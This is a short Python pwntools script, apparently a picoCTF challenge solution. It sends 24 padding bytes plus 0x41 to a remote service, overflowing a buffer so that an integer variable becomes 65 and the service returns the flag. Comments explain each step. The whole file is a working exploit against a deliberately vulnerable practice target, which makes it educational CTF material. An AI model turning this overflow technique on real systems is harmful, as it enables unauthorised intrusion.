from pwn import *

host = 'saturn.picoctf.net'
port = 54182

pad = b'A' * 24 #To get to our buffer and overflow it
numb = b'\x41' #The target binary is set to int num = 64; and to get our flag we need the num variable to equal 65. 0x41 is 65 in hexadecimal and we use this to overwrite the num variable

payload = pad + numb #Creating our payload

connect = remote(host,port) #Connecting to target
connect.sendlineafter(':', payload) #Sending payload after we get the ":" character from the server
output = connect.recvall() #Getting out data back

print(output[21:]) #Printing the flag
